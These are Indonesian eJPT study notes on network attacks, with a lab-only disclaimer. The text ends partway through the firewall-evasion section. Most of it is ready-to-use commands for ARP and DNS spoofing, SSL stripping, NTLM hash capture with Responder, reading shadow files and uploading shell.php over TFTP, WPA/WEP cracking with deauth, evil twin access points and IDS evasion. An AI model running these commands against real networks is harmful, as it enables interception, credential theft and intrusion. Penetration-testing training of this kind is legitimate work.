# 🌐 eJPT — Network-Based Attacks
### Host & Network Penetration Testing

> **Disclaimer**: Seluruh materi ini hanya untuk tujuan **edukasi**, **sertifikasi**, dan **legal penetration testing** di lingkungan lab yang telah mendapat izin. Penggunaan teknik ini di luar konteks yang diizinkan adalah ilegal dan melanggar hukum.

---

## 📋 Daftar Isi

1. [Overview & Konsep Dasar Jaringan](#1-overview--konsep-dasar-jaringan)
2. [Network Reconnaissance](#2-network-reconnaissance)
   - [Passive Reconnaissance](#21-passive-reconnaissance)
   - [Active Reconnaissance](#22-active-reconnaissance)
   - [Nmap Advanced Scanning](#23-nmap-advanced-scanning)
3. [Sniffing & Traffic Analysis](#3-sniffing--traffic-analysis)
   - [Wireshark](#31-wireshark)
   - [Tcpdump](#32-tcpdump)
   - [Network Sniffing dengan Metasploit](#33-network-sniffing-dengan-metasploit)
4. [Man-in-the-Middle (MITM) Attacks](#4-man-in-the-middle-mitm-attacks)
   - [ARP Poisoning / Spoofing](#41-arp-poisoning--spoofing)
   - [Ettercap](#42-ettercap)
   - [Bettercap](#43-bettercap)
   - [Responder](#44-responder)
5. [Network Service Exploitation](#5-network-service-exploitation)
   - [SNMP Exploitation](#51-snmp-exploitation)
   - [SMTP Exploitation](#52-smtp-exploitation)
   - [DNS Attacks](#53-dns-attacks)
   - [TFTP Exploitation](#54-tftp-exploitation)
6. [Wi-Fi Attacks](#6-wi-fi-attacks)
   - [WPA/WPA2 Cracking](#61-wpawpa2-cracking)
   - [WEP Cracking](#62-wep-cracking)
   - [Evil Twin Attack](#63-evil-twin-attack)
7. [Firewall & IDS Evasion](#7-firewall--ids-evasion)
8. [Pivoting & Tunneling](#8-pivoting--tunneling)
   - [Port Forwarding](#81-port-forwarding)
   - [SSH Tunneling](#82-ssh-tunneling)
   - [Metasploit Pivoting](#83-metasploit-pivoting)
   - [Proxychains](#84-proxychains)
9. [Network Protocol Attacks](#9-network-protocol-attacks)
   - [NetBIOS & LLMNR Poisoning](#91-netbios--llmnr-poisoning)
   - [IPv6 Attacks](#92-ipv6-attacks)
10. [Post-Exploitation Networking](#10-post-exploitation-networking)
11. [Cheat Sheet & Quick Reference](#11-cheat-sheet--quick-reference)

---

## 1. Overview & Konsep Dasar Jaringan

### Apa itu Network-Based Attacks?

Network-Based Attacks adalah teknik serangan yang menargetkan **protokol jaringan**, **layanan jaringan**, dan **infrastruktur komunikasi** antar host. Berbeda dengan host-based attacks yang menyerang OS secara langsung, network attacks mengeksploitasi cara data ditransmisikan dan diproses di jaringan.

### Model OSI & Layer Serangan

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          MODEL OSI & SERANGAN                           │
├───────┬─────────────────┬────────────────────────────────────────────── ┤
│ Layer │ Nama            │ Contoh Serangan                                │
├───────┼─────────────────┼────────────────────────────────────────────── ┤
│   7   │ Application     │ SQL Injection, XSS, SMTP abuse, DNS poisoning  │
│   6   │ Presentation    │ SSL stripping, encoding attacks                │
│   5   │ Session         │ Session hijacking, cookie theft                │
│   4   │ Transport       │ TCP SYN flood, port scanning, session reset    │
│   3   │ Network         │ IP spoofing, ICMP flood, routing attacks       │
│   2   │ Data Link       │ ARP poisoning, MAC flooding, VLAN hopping      │
│   1   │ Physical        │ Wiretapping, signal jamming                    │
└───────┴─────────────────┴────────────────────────────────────────────── ┘
```

### Konsep Penting yang Harus Dipahami

#### IP Addressing & Subnetting

```
Kelas A: 1.0.0.0   - 126.255.255.255   /8   (255.0.0.0)
Kelas B: 128.0.0.0 - 191.255.255.255   /16  (255.255.0.0)
Kelas C: 192.0.0.0 - 223.255.255.255   /24  (255.255.255.0)

Private Ranges:
  10.0.0.0/8          (Class A private)
  172.16.0.0/12       (Class B private)
  192.168.0.0/16      (Class C private)

CIDR Notation:
  /24 = 256 hosts  (254 usable)
  /23 = 512 hosts  (510 usable)
  /16 = 65536 hosts
```

#### Protokol Penting & Port

| Protokol | Port | Layer | Keterangan |
|---|---|---|---|
| ICMP | — | 3 | Ping, traceroute |
| DNS | 53 | 7 | Resolusi nama domain |
| DHCP | 67/68 | 7 | Distribusi IP otomatis |
| TFTP | 69 | 7 | Transfer file sederhana (UDP) |
| HTTP | 80 | 7 | Web tidak terenkripsi |
| HTTPS | 443 | 7 | Web terenkripsi |
| SNMP | 161/162 | 7 | Manajemen jaringan |
| SMTP | 25/587 | 7 | Pengiriman email |
| POP3 | 110 | 7 | Penerimaan email |
| IMAP | 143 | 7 | Email (sync) |
| NetBIOS | 137-139 | 5-7 | Windows naming |
| LDAP | 389 | 7 | Directory services |
| Kerberos | 88 | 7 | Autentikasi Windows |
| NTP | 123 | 7 | Sinkronisasi waktu |

---

## 2. Network Reconnaissance

### 2.1 Passive Reconnaissance

Pengumpulan informasi **tanpa berinteraksi langsung** dengan target. Tidak meninggalkan jejak di log target.

#### OSINT Jaringan

```bash
# Whois lookup
whois target.com
whois 192.168.1.1

# DNS lookup
nslookup target.com
nslookup -type=MX target.com    # mail servers
nslookup -type=NS target.com    # name servers
nslookup -type=TXT target.com   # TXT records

# Dig - lebih detail
dig target.com
dig target.com ANY              # semua record
dig target.com MX               # mail server
dig target.com NS               # name server
dig target.com AXFR             # zone transfer (jika diizinkan)
dig @ns1.target.com target.com AXFR  # zone transfer ke NS spesifik

# Host command
host target.com
host -t mx target.com
host -t ns target.com

# theHarvester - email & subdomain gathering
theHarvester -d target.com -b google
theHarvester -d target.com -b bing,google,linkedin

# Shodan (cari device yang terhubung internet)
# Buka browser: https://www.shodan.io/
# Query: hostname:target.com
# Query: ip:TARGET_IP
# Query: port:3389 country:ID
```

#### DNS Zone Transfer

Zone transfer adalah mekanisme backup DNS yang jika tidak diamankan, memungkinkan attacker mendapatkan semua record DNS sebuah domain.

```bash
# Cek apakah zone transfer diizinkan
dig axfr @ns1.target.com target.com
dig axfr @ns2.target.com target.com

# Dengan dnsenum
dnsenum target.com
dnsenum --enum target.com

# Dengan fierce
fierce --domain target.com
fierce --domain target.com --dns-servers 8.8.8.8

# Dengan dnsrecon
dnsrecon -d target.com -t axfr
dnsrecon -d target.com -t std     # standard recon
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt  # brute
```

---

### 2.2 Active Reconnaissance

Pengumpulan informasi **dengan berinteraksi langsung** dengan target. Meninggalkan jejak di log.

#### Host Discovery

```bash
# Ping sweep - cari host aktif di subnet
nmap -sn 192.168.1.0/24
nmap -sn 192.168.1.1-254

# Dengan fping
fping -a -g 192.168.1.0/24 2>/dev/null

# Dengan arp-scan (lebih akurat di LAN)
arp-scan 192.168.1.0/24
arp-scan --interface=eth0 --localnet

# Netdiscover (ARP-based)
netdiscover -r 192.168.1.0/24
netdiscover -i eth0 -r 10.0.0.0/8

# Masscan (sangat cepat)
masscan 192.168.1.0/24 -p 80,443,22,445 --rate=1000
masscan 10.0.0.0/8 -p 0-65535 --rate=10000
```

#### Traceroute

```bash
# Traceroute dasar (Linux)
traceroute target.com
traceroute -n target.com         # tanpa DNS resolution (lebih cepat)
traceroute -T -p 80 target.com   # TCP traceroute (lebih baik melewati firewall)

# Windows
tracert target.com

# Dengan Nmap
nmap --traceroute target.com
nmap -sn --traceroute target.com
```

---

### 2.3 Nmap Advanced Scanning

Nmap adalah tool utama reconnaissance jaringan. Wajib dikuasai dengan baik untuk eJPT.

#### Jenis-jenis Scan Nmap

```bash
# ─── HOST DISCOVERY ────────────────────────────────────────

# Ping scan (tidak scan port)
nmap -sn TARGET/CIDR

# Tidak melakukan host discovery, langsung scan port
nmap -Pn TARGET

# ─── PORT SCANNING ─────────────────────────────────────────

# TCP SYN Scan (default, butuh root, "stealth scan")
nmap -sS TARGET

# TCP Connect Scan (tidak butuh root, lebih mudah terdeteksi)
nmap -sT TARGET

# UDP Scan (lambat tapi penting)
nmap -sU TARGET
nmap -sU -sS TARGET              # scan UDP + TCP bersamaan

# Scan port spesifik
nmap -p 22,80,443 TARGET
nmap -p 1-1000 TARGET
nmap -p- TARGET                  # semua 65535 port

# Scan port paling umum
nmap --top-ports 100 TARGET
nmap --top-ports 1000 TARGET

# ─── SERVICE & VERSION DETECTION ───────────────────────────

# Version detection
nmap -sV TARGET
nmap -sV --version-intensity 9 TARGET    # lebih agresif

# OS detection (butuh root)
nmap -O TARGET
nmap -O --osscan-guess TARGET

# Gabungan (direkomendasikan untuk eJPT)
nmap -sV -sC -O TARGET
nmap -A TARGET                   # aggressive: -sV -sC -O --traceroute

# ─── SCRIPT SCANNING ───────────────────────────────────────

# Default scripts
nmap -sC TARGET

# Script kategori
nmap --script auth TARGET        # autentikasi
nmap --script brute TARGET       # brute force
nmap --script discovery TARGET   # discovery
nmap --script exploit TARGET     # eksploitasi
nmap --script vuln TARGET        # kerentanan
nmap --script safe TARGET        # aman (tidak berbahaya)

# Script spesifik
nmap --script smb-vuln* TARGET
nmap --script http-enum TARGET
nmap --script ftp-anon TARGET

# Beberapa script sekaligus
nmap --script "smb-vuln*,smb-enum*" TARGET

# ─── OUTPUT ─────────────────────────────────────────────────

# Output ke file
nmap -oN output.txt TARGET       # normal
nmap -oX output.xml TARGET       # XML
nmap -oG output.gnmap TARGET     # grepable
nmap -oA output TARGET           # semua format

# ─── TIMING & PERFORMANCE ───────────────────────────────────

# Timing template (T0=paling lambat, T5=paling cepat)
nmap -T0 TARGET    # Paranoid (sangat lambat, IDS evasion)
nmap -T1 TARGET    # Sneaky
nmap -T2 TARGET    # Polite
nmap -T3 TARGET    # Normal (default)
nmap -T4 TARGET    # Aggressive (direkomendasikan di lab)
nmap -T5 TARGET    # Insane (mungkin tidak akurat)

# ─── FULL SCAN TEMPLATE UNTUK eJPT ─────────────────────────

# Scan lengkap satu target
nmap -sV -sC -O -p- -T4 TARGET -oN full_scan.txt

# Scan cepat untuk discovery awal
nmap -sV --top-ports 1000 -T4 TARGET/CIDR -oN quick_scan.txt

# Scan vulnerability
nmap -sV --script vuln TARGET -oN vuln_scan.txt
```

#### Nmap NSE Scripts Penting

```bash
# HTTP
nmap --script http-title TARGET
nmap --script http-headers TARGET
nmap --script http-enum TARGET              # enumerate web directories
nmap --script http-methods TARGET
nmap --script http-auth-finder TARGET
nmap --script http-brute TARGET             # brute force HTTP auth

# SMB
nmap --script smb-enum-shares TARGET
nmap --script smb-enum-users TARGET
nmap --script smb-os-discovery TARGET
nmap --script smb-security-mode TARGET
nmap --script smb-vuln-ms17-010 TARGET      # EternalBlue check
nmap --script smb-vuln-ms08-067 TARGET      # Conficker check

# FTP
nmap --script ftp-anon TARGET
nmap --script ftp-brute TARGET
nmap --script ftp-bounce TARGET

# SSH
nmap --script ssh-auth-methods TARGET
nmap --script ssh-brute TARGET

# DNS
nmap --script dns-zone-transfer TARGET
nmap --script dns-brute TARGET
nmap --script dns-recursion TARGET

# SNMP
nmap --script snmp-info TARGET
nmap --script snmp-brute TARGET
nmap --script snmp-sysdescr TARGET
```

---

## 3. Sniffing & Traffic Analysis

### Konsep Dasar Sniffing

**Network sniffing** adalah teknik menangkap dan menganalisis paket data yang melewati jaringan. Efektif di jaringan yang tidak terenkripsi (HTTP, Telnet, FTP, SMTP tanpa TLS).

**Kondisi yang diperlukan:**
- Berada di jaringan yang sama dengan target
- Interface dalam **promiscuous mode** (menangkap semua paket, bukan hanya yang ditujukan untuk kita)
- Di switch network: perlu ARP poisoning dulu agar traffic melewati kita

### 3.1 Wireshark

Wireshark adalah GUI network analyzer paling populer.

#### Capture Filter (sebelum capture)

```
# Tangkap berdasarkan host
host 192.168.1.100

# Tangkap berdasarkan subnet
net 192.168.1.0/24

# Tangkap port spesifik
port 80
port 21 or port 22

# Tangkap protokol
arp
icmp
tcp
udp

# Kombinasi
host 192.168.1.100 and port 80
not broadcast and not multicast
```

#### Display Filter (setelah capture)

```
# Filter IP
ip.addr == 192.168.1.100
ip.src == 192.168.1.10
ip.dst == 192.168.1.100

# Filter port
tcp.port == 80
tcp.dstport == 443
udp.port == 53

# Filter protokol
http
ftp
dns
arp
icmp
smtp
telnet

# HTTP spesifik
http.request.method == "POST"
http.request.uri contains "login"
http.response.code == 200

# Credentials di cleartext
http contains "password"
ftp contains "PASS"

# Ukuran paket
frame.len > 1000
tcp.len > 500

# Follow TCP stream
# Klik kanan pada paket → Follow → TCP Stream
# Akan menampilkan konversasi lengkap

# Kombinasi
ip.src == 192.168.1.10 && tcp.port == 80
http.request.method == "POST" && ip.dst == 192.168.1.100
```

#### Fitur Penting Wireshark

```
# Statistik jaringan
Statistics → Protocol Hierarchy    → persentase tiap protokol
Statistics → Conversations         → konversasi antar host
Statistics → Endpoints             → daftar host aktif
Statistics → IO Graph              → grafik traffic

# Expert Information
Analyze → Expert Information       → error, warning, anomali

# Credentials Harvesting
Edit → Find Packet → String → "password" atau "pass"
Analyze → Follow → TCP Stream      → lihat konversasi cleartext

# Decrypt HTTPS (jika punya private key atau session key)
Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log
```

---

### 3.2 Tcpdump

Tcpdump adalah CLI packet analyzer, lebih cocok untuk server tanpa GUI.

```bash
# Dasar - capture semua traffic
tcpdump -i eth0

# Capture dengan verbose
tcpdump -i eth0 -v
tcpdump -i eth0 -vvv

# Jangan resolve hostname & port (lebih cepat)
tcpdump -i eth0 -n
tcpdump -i eth0 -nn

# Simpan ke file pcap
tcpdump -i eth0 -w capture.pcap

# Baca file pcap
tcpdump -r capture.pcap
tcpdump -r capture.pcap -nn

# ─── FILTER ─────────────────────────────────────────────────

# Filter berdasarkan host
tcpdump -i eth0 host 192.168.1.100
tcpdump -i eth0 src 192.168.1.10
tcpdump -i eth0 dst 192.168.1.100

# Filter berdasarkan port
tcpdump -i eth0 port 80
tcpdump -i eth0 port 21 or port 22
tcpdump -i eth0 not port 22

# Filter protokol
tcpdump -i eth0 tcp
tcpdump -i eth0 udp
tcpdump -i eth0 icmp
tcpdump -i eth0 arp

# Filter subnet
tcpdump -i eth0 net 192.168.1.0/24

# ─── TAMPILKAN KONTEN PAKET ────────────────────────────────

# ASCII content
tcpdump -i eth0 -A port 80
tcpdump -i eth0 -A port 21

# ASCII + HEX
tcpdump -i eth0 -X port 80

# ─── CONTOH PRAKTIS ────────────────────────────────────────

# Capture HTTP traffic dan tampilkan konten
tcpdump -i eth0 -A -s 0 port 80

# Capture FTP credentials
tcpdump -i eth0 -A port 21 | grep -E "USER|PASS"

# Capture DNS queries
tcpdump -i eth0 -n port 53

# Capture semua kecuali SSH (agar tidak noise)
tcpdump -i eth0 not port 22 -w capture.pcap

# Capture dan limit ukuran file
tcpdump -i eth0 -C 100 -w capture.pcap   # rotate tiap 100MB
tcpdump -i eth0 -W 5 -w capture.pcap     # simpan maksimal 5 file
```

---

### 3.3 Network Sniffing dengan Metasploit

```bash
# Dari sesi Meterpreter yang sudah ada
meterpreter> use sniffer

# Atau load module
meterpreter> load sniffer
meterpreter> sniffer_interfaces            # list interface
meterpreter> sniffer_start 1              # mulai sniff di interface 1
meterpreter> sniffer_stats 1              # statistik
meterpreter> sniffer_dump 1 /tmp/cap.pcap # dump ke file
meterpreter> sniffer_stop 1               # hentikan

# Analisis dengan Wireshark setelah download file pcap
```

---

## 4. Man-in-the-Middle (MITM) Attacks

### Konsep MITM

Dalam serangan MITM, attacker **menyisipkan dirinya** di antara dua pihak yang berkomunikasi. Kedua pihak mengira sedang berkomunikasi langsung satu sama lain, padahal semua traffic melewati attacker.

```
NORMAL:
  [Client] ←──────────────────→ [Server]

MITM:
  [Client] ←──→ [Attacker] ←──→ [Server]
              (intercept & relay)
```

### 4.1 ARP Poisoning / Spoofing

#### Cara Kerja ARP

**ARP (Address Resolution Protocol)** memetakan IP address ke MAC address di jaringan lokal. ARP tidak memiliki mekanisme autentikasi, sehingga siapapun bisa mengirim ARP reply palsu.

```
NORMAL ARP:
  "Siapa yang punya IP 192.168.1.1?" (broadcast)
  "Saya! MAC saya adalah AA:BB:CC:DD:EE:FF" (router menjawab)

ARP POISONING:
  Attacker terus-menerus mengirim:
  → ke Client: "IP 192.168.1.1 (Router) = MAC attacker"
  → ke Router: "IP 192.168.1.100 (Client) = MAC attacker"
  Sekarang semua traffic Client↔Router melewati Attacker!
```

#### Setup IP Forwarding

Sebelum ARP poisoning, aktifkan IP forwarding agar traffic tetap diteruskan (tidak DoS):

```bash
# Enable IP forwarding (Linux)
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1

# Permanen (edit sysctl.conf)
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
sysctl -p
```

#### Arpspoof

```bash
# Install
apt-get install dsniff

# ARP poisoning dua arah (dua terminal terpisah)
# Terminal 1: Beritahu CLIENT bahwa MAC kita = IP Router
arpspoof -i eth0 -t CLIENT_IP ROUTER_IP

# Terminal 2: Beritahu ROUTER bahwa MAC kita = IP Client
arpspoof -i eth0 -t ROUTER_IP CLIENT_IP

# Sekarang semua traffic Client↔Router melewati kita
# Buka Wireshark untuk menangkap credentials
```

---

### 4.2 Ettercap

Ettercap adalah tool MITM yang lebih komprehensif dengan fitur plugin.

```bash
# Mode teks interaktif (GUI di terminal)
ettercap -T -q -i eth0

# ARP poisoning semua host di LAN
ettercap -T -q -i eth0 -M arp:remote /GATEWAY_IP/ /TARGET_IP/

# ARP poisoning ke semua host
ettercap -T -q -i eth0 -M arp:remote /GATEWAY_IP//

# Mode GUI
ettercap -G

# Dengan plugin
ettercap -T -q -i eth0 -M arp -P autoadd        # auto-add hosts
ettercap -T -q -i eth0 -M arp -P dns_spoof      # DNS spoofing

# Cara pakai ettercap GUI:
# 1. Sniff → Unified Sniffing → pilih interface
# 2. Hosts → Scan for Hosts
# 3. Hosts → Hosts List
# 4. Tambahkan gateway ke Target 1, victim ke Target 2
# 5. Mitm → ARP Poisoning → check "Sniff remote connections"
# 6. Start → Start Sniffing
# 7. View → Connections untuk lihat traffic
```

#### DNS Spoofing dengan Ettercap

```bash
# Edit file konfigurasi DNS
nano /etc/ettercap/etter.dns

# Tambahkan entry:
# target.com  A  ATTACKER_IP
# *.target.com A ATTACKER_IP
# www.target.com  A  ATTACKER_IP

# Jalankan dengan plugin dns_spoof
ettercap -T -q -i eth0 -M arp:remote /GATEWAY// -P dns_spoof

# Buat web server untuk serve halaman palsu
python3 -m http.server 80
# atau
service apache2 start
```

---

### 4.3 Bettercap

Bettercap adalah penerus ettercap yang lebih modern dan powerful.

```bash
# Install
apt-get install bettercap
# atau
go install github.com/bettercap/bettercap@latest

# Jalankan
bettercap -iface eth0

# ─── PERINTAH DALAM BETTERCAP SHELL ────────────────────────

# Lihat semua module
help

# Network discovery
net.probe on                     # scan host di jaringan
net.show                         # tampilkan host yang ditemukan

# ARP spoofing
set arp.spoof.targets 192.168.1.5,192.168.1.10
set arp.spoof.fullduplex true    # dua arah
arp.spoof on

# Sniffing
net.sniff on                     # mulai sniff
set net.sniff.verbose true       # verbose output

# HTTP proxy (intercept HTTP)
set http.proxy.sslstrip true     # downgrade HTTPS ke HTTP
http.proxy on

# HTTPS proxy (butuh certificate)
https.proxy on

# DNS spoofing
set dns.spoof.domains target.com,*.target.com
set dns.spoof.address ATTACKER_IP
dns.spoof on

# Caplets (automation scripts)
bettercap -iface eth0 -caplet /path/to/script.cap

# Script caplet contoh (mitm.cap):
# net.probe on
# set arp.spoof.fullduplex true
# set arp.spoof.targets 192.168.1.0/24
# arp.spoof on
# net.sniff on
```

---

### 4.4 Responder

Responder mengeksploitasi protokol LLMNR, NBT-NS, dan MDNS untuk menangkap hash NTLMv2. Sangat efektif di jaringan Windows.

```bash
# Jalankan Responder
responder -I eth0

# Mode verbose
responder -I eth0 -v

# Hanya listen (tanpa poisoning)
responder -I eth0 -A

# Dengan analisis mode (tidak send response)
responder -I eth0 --analyze

# Hasil hash tersimpan di:
ls /usr/share/responder/logs/
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-TARGET_IP.txt

# Crack hash yang ditangkap
hashcat -m 5600 hash.txt rockyou.txt    # NTLMv2
john --wordlist=rockyou.txt hash.txt
```

---

## 5. Network Service Exploitation

### 5.1 SNMP Exploitation

#### Apa itu SNMP?

**SNMP (Simple Network Management Protocol)** digunakan untuk monitoring dan manajemen perangkat jaringan (router, switch, printer, server). Berjalan di UDP port **161** (agent) dan **162** (trap).

**Versi SNMP:**
- **SNMPv1/v2c**: Menggunakan "community string" sebagai password (cleartext!)
- **SNMPv3**: Mendukung enkripsi dan autentikasi yang lebih kuat

Default community strings: `public` (read-only), `private` (read-write)

#### Enumerasi SNMP

```bash
# Nmap SNMP scan
nmap -sU -p 161 TARGET_IP
nmap -sU -p 161 --script snmp-info TARGET_IP
nmap -sU -p 161 --script snmp-brute TARGET_IP
nmap -sU -p 161 --script snmp-sysdescr TARGET_IP

# snmpwalk - jelajahi semua OID
snmpwalk -v2c -c public TARGET_IP
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.1    # system info
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.4.2.1.2  # running processes
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.6.3.1.2  # installed software
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.4.1.77.1.2.25   # user accounts (Windows)

# snmpget - ambil nilai OID tertentu
snmpget -v2c -c public TARGET_IP 1.3.6.1.2.1.1.1.0   # sysDescr
snmpget -v2c -c public TARGET_IP 1.3.6.1.2.1.1.5.0   # hostname

# onesixtyone - brute force community string
onesixtyone -c /usr/share/wordlists/snmp.txt TARGET_IP
onesixtyone -c community_strings.txt -i hosts.txt

# snmp-check - comprehensive enumeration
snmp-check TARGET_IP -c public
snmp-check TARGET_IP -c public -v 2c

# Metasploit SNMP
use auxiliary/scanner/snmp/snmp_login
set RHOSTS TARGET_IP
set COMMUNITY public
run

use auxiliary/scanner/snmp/snmp_enum
set RHOSTS TARGET_IP
set COMMUNITY public
run
```

#### OID Penting

```
1.3.6.1.2.1.1.1.0      sysDescr          - deskripsi sistem
1.3.6.1.2.1.1.5.0      sysName           - hostname
1.3.6.1.2.1.25.4.2.1.2 hrSWRunName       - running processes
1.3.6.1.2.1.25.6.3.1.2 hrSWInstalledName - installed software
1.3.6.1.4.1.77.1.2.25  usrAccountIndex   - Windows user accounts
1.3.6.1.2.1.4.20.1.1   ipAdEntAddr       - IP addresses
1.3.6.1.2.1.4.34.1.3   ipAddressIfIndex  - network interfaces
```

---

### 5.2 SMTP Exploitation

#### Apa itu SMTP?

**SMTP (Simple Mail Transfer Protocol)** digunakan untuk mengirim email. Berjalan di port **25** (server-to-server) dan **587** (submission, terenkripsi).

#### Enumerasi SMTP

```bash
# Banner grabbing
nc TARGET_IP 25
telnet TARGET_IP 25

# Setelah terhubung:
HELO attacker.com
EHLO attacker.com    # extended SMTP, tampilkan fitur

# Enumerasi user via VRFY command
VRFY root
VRFY admin
VRFY user@domain.com

# Via EXPN (expand mailing list)
EXPN admin
EXPN users

# Via RCPT TO (menguji tanpa kirim email)
MAIL FROM: test@test.com
RCPT TO: admin@target.com
RCPT TO: nonexistent@target.com

# Nmap SMTP scripts
nmap -p 25 --script smtp-enum-users TARGET_IP
nmap -p 25 --script smtp-commands TARGET_IP
nmap -p 25 --script smtp-open-relay TARGET_IP
nmap -p 25 --script smtp-vuln* TARGET_IP

# smtp-user-enum tool
smtp-user-enum -M VRFY -U users.txt -t TARGET_IP
smtp-user-enum -M RCPT -U users.txt -t TARGET_IP -D target.com
smtp-user-enum -M EXPN -U users.txt -t TARGET_IP
```

#### Open Relay Testing

Open relay adalah SMTP server yang memungkinkan siapapun mengirim email melaluinya (dapat digunakan untuk spam).

```bash
# Test manual
telnet TARGET_IP 25
HELO attacker.com
MAIL FROM: spoofed@gmail.com
RCPT TO: victim@target.com
DATA
Subject: Test Open Relay
This is a test.
.
QUIT

# Nmap
nmap -p 25 --script smtp-open-relay TARGET_IP
```

---

### 5.3 DNS Attacks

#### DNS Cache Poisoning

Memasukkan entri DNS palsu ke dalam cache resolver sehingga korban diarahkan ke IP palsu.

```bash
# Dengan ettercap (lihat bagian MITM)

# Dengan dnschef (DNS proxy)
dnschef --fakeip ATTACKER_IP --fakedomains target.com --interface eth0

# Dengan Metasploit
use auxiliary/spoof/dns/bailiwicked_domain
set INTERFACE eth0
set TARGETHOST TARGET_IP
set SPOOFIP ATTACKER_IP
set DOMAIN target.com
run
```

#### DNS Enumeration

```bash
# Brute force subdomain
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
ffuf -w subdomains.txt -u https://FUZZ.target.com

# Reverse DNS lookup
dnsrecon -r 192.168.1.0/24
nmap -sn 192.168.1.0/24 --dns-servers TARGET_DNS
```

---

### 5.4 TFTP Exploitation

**TFTP (Trivial File Transfer Protocol)** adalah versi sederhana FTP yang menggunakan UDP port **69**. Tidak ada autentikasi!

```bash
# Nmap scan TFTP
nmap -sU -p 69 TARGET_IP
nmap -sU -p 69 --script tftp-enum TARGET_IP

# Akses TFTP
tftp TARGET_IP
tftp> get /etc/passwd
tftp> get ../../etc/shadow   # directory traversal
tftp> put malicious.txt      # upload file

# TFTP client command line
tftp -v TARGET_IP 69 -m binary -c get boot.cfg
tftp -v TARGET_IP 69 -m binary -c put shell.php

# Metasploit TFTP enumeration
use auxiliary/scanner/tftp/tftpbrute
set RHOSTS TARGET_IP
set FILELIST /usr/share/wordlists/tftp.txt
run
```

---

## 6. Wi-Fi Attacks

### Persiapan: Mode Monitor

```bash
# Cek wireless interface
iwconfig
ip link show

# Matikan interface dulu
ifconfig wlan0 down

# Aktifkan monitor mode
iwconfig wlan0 mode monitor
# atau
airmon-ng start wlan0

# Verifikasi (interface biasanya jadi wlan0mon)
iwconfig

# Matikan proses yang bisa mengganggu
airmon-ng check kill
```

### 6.1 WPA/WPA2 Cracking

#### Langkah-langkah

```bash
# 1. Scan jaringan Wi-Fi sekitar
airodump-ng wlan0mon

# Output penting:
# BSSID = MAC access point
# PWR   = signal strength
# ENC   = enkripsi (WPA2, WPA, WEP, OPN)
# ESSID = nama network (SSID)
# CH    = channel

# 2. Fokus ke target, simpan handshake
airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan0mon
# -c : channel target
# --bssid : MAC address access point
# -w : nama file output

# 3. Paksa client re-autentikasi (deauth attack) - terminal baru
aireplay-ng --deauth 100 -a TARGET_BSSID -c CLIENT_MAC wlan0mon
# --deauth 100 : kirim 100 deauth frame
# -a : BSSID access point
# -c : MAC client yang akan diserang (opsional, tanpa -c = semua client)

# Setelah terlihat "WPA handshake: XX:XX:XX:XX:XX:XX" di airodump
# Tekan Ctrl+C

# 4. Crack handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Dengan hashcat (lebih cepat dengan GPU)
# Konversi cap ke hccapx dulu
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 2500 capture.hccapx rockyou.txt    # WPA/WPA2

# WPA3 (format baru)
hashcat -m 22000 capture.hccapx rockyou.txt
```

#### PMKID Attack (tanpa deauth, tanpa client)

```bash
# Lebih efisien - tidak perlu menunggu client connect

# Dengan hcxdumptool (capture PMKID)
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng

# Konversi ke hashcat format
hcxpcapngtool -o hash.txt pmkid.pcapng

# Crack
hashcat -m 22000 hash.txt rockyou.txt
```

---

### 6.2 WEP Cracking

WEP (Wired Equivalent Privacy) sudah sangat lemah dan bisa di-crack dalam hitungan menit.

```bash
# 1. Scan dan identifikasi target WEP
airodump-ng wlan0mon

# 2. Mulai capture, fokus ke target
airodump-ng -c CHANNEL --bssid TARGET_BSSID -w wep_capture wlan0mon

# 3. Fake authentication (agar bisa inject packets)
aireplay-ng -1 0 -a TARGET_BSSID -h OUR_MAC wlan0mon

# 4. ARP replay attack (generate IVs)
aireplay-ng -3 -b TARGET_BSSID -h OUR_MAC wlan0mon
# Tunggu sampai terkumpul minimal 10,000-20,000 IVs (#Data di airodump)

# 5. Crack WEP key
aircrack-ng wep_capture-01.cap
# Biasanya berhasil dengan 20,000-40,000 IVs
```

---

### 6.3 Evil Twin Attack

Membuat access point palsu dengan SSID sama seperti target untuk menangkap credentials.

```bash
# Tool: hostapd-wpe atau airbase-ng

# Dengan airbase-ng (basic)
airbase-ng -e "Target WiFi Name" -c CHANNEL wlan0mon

# Setup DHCP server untuk client yang connect
apt-get install dnsmasq

# Konfigurasi dnsmasq
cat > /tmp/dnsmasq.conf << EOF
interface=at0
dhcp-range=192.168.1.50,192.168.1.150,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
EOF

# Setup interface
ifconfig at0 up 192.168.1.1 netmask 255.255.255.0
dnsmasq -C /tmp/dnsmasq.conf -d

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Dengan hostapd-wpe (lebih advanced, capture WPA credentials)
apt-get install hostapd-wpe
# Edit /etc/hostapd-wpe/hostapd-wpe.conf
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

---

## 7. Firewall & IDS Evasion

### Teknik Evasion Nmap

```bash
# ─── FIREWALL EVASION ───────────────────────────────────────

# Fragmentasi paket (sulit dianalisis firewall)
nmap -f TARGET_IP
nmap -f -f TARGET_IP    # double fragmentation
nmap --mtu 16 TARGET_IP # MTU kecil

# Decoy scan (sembunyikan IP asli di antara IP palsu)
nmap -D RND:10 TARGET_IP              # 10 IP decoy random
nmap -D 1.1.1.1,2.2.2.2,ME TARGET_IP # decoy spesifik

# Source port manipulation (beberapa firewall izinkan port tertentu)
nmap --source-port 53 TARGET_IP      # pura-pura dari port 53 (DNS)
nmap --source-port 80 TARGET_IP      # pura-pura dari port 80

